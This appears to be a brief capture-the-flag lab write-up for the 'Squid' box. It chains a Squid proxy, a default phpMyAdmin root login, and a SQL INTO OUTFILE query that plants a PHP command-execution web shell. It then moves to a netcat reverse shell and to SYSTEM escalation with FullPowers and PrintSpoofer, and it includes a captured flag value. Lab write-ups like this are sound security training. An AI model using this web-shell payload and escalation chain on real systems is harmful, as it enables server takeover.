###### tags: `Offsec` `PG Practice` `Easy` `Windows` # Squid
```
┌──(kali㉿kali)-[~/pgplay]
...
``` Refer to [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid) for scanning
```
┌──(kali㉿kali)-[~/pgplay]
...
``` Modify your browser proxy to access the site. Check `http://192.168.162.189:8080/phpmyadmin/` to login with the default account `root` (empty password).
Then visit `http://192.168.162.189:8080/?phpinfo=-1` to find upload paths ![Squid_1.png](picture/Squid_1.png) ```
DOCUMENT_ROOT 	C:/wamp/www
``` phpmyadminshell ![Squid_2.png](picture/Squid_2.png) ```
SELECT "<?php echo system($_GET['cmd']); ?>" into OUTFILE 'C:/wamp/www/shell.php' 
``` Check`http://192.168.162.189:8080/shell.php?cmd=whoami`
shell.php? ![Squid_3.png](picture/Squid_3.png) create a reverse shell,Open nc
```
┌──(kali㉿kali)-[~/pgplay]
...
``` wait for reverse shell,`C:\`local.txt
```
C:\>type local.txt
ccd3073711e018da88ae587d78b55496
``` From the writeup I found this tool, [FullPowers](https://github.com/itm4n/FullPowers/releases/tag/v0.1), which I found useful. It can help a `local service` user escalate to SYSTEM; here I used it to get `SeImpersonatePrivilege` and then used PrintSpoofer
```
...
``` wait for the reverse shell, check privileges, then download `PrintSpoofer`
```
...
``` after waiting for the reverse shell,`C:\Users\Administrator\Desktop`get proof.txt
```
